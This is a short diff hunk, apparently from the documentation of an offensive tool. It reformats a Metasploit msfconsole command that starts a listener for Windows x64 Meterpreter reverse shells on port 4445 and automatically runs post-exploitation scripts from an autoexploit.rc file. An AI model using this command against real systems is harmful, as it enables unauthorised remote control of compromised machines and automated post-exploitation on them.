@@ -561,8 +561,7 @@ end
 # payload generation, open a new terminal:
 
 ```
-msfconsole -qx "use exploit/multi/handler; set payload                                                                                                     windows/x64/meterpreter/reverse_tcp;set lhost eth0; set lport 4445; set EXITFUNC thread; set AutoRunScript post/multi/manage/multi_post MACRO=/root/autoexploit.rc; 
-set ExitOnSession false; exploit -j"
+msfconsole -qx "use exploit/multi/handler; set payload                                                                                                  windows/x64/meterpreter/reverse_tcp;set lhost eth0; set lport 4445; set EXITFUNC thread; set AutoRunScript post/multi/manage/multi_post; MACRO=/root/autoexploit.rc; set ExitOnSession false; exploit -j"
 ```
 
 
